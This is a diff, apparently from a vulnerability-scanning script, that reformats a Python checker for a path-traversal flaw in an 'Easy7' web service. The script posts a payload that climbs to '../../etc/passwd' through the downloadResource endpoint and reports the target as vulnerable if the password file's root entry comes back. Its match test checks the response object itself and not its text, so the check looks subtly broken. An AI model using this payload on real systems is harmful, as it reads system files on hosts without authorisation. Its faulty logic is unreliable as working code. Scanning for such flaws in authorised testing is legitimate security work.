@@ -7,9 +7,9 @@ requests.packages.urllib3.disable_warnings()
 
 def check(target):
     headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-    "Accept": "*/*",
-    "Content-Type": "application/x-www-form-urlencoded"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded"
     }
 
     url = '/Easy7/rest/file/downloadResource'
@@ -17,10 +17,11 @@ def check(target):
     if not target.startswith("http"):
         target = f"http://{target}"
 
-    data = {"path":"passwd", "srsPathId":"../../etc/"}
+    data = {"path": "passwd", "srsPathId": "../../etc/"}
 
     try:
-        resp = requests.post(target + url, headers=headers, data=data, verify=False, timeout=30)
+        resp = requests.post(target + url, headers=headers,
+                             data=data, verify=False, timeout=30)
         if 'root:x:0:0:root' in resp:
             print(f"{target} 存在漏洞")
     except RequestException as e:
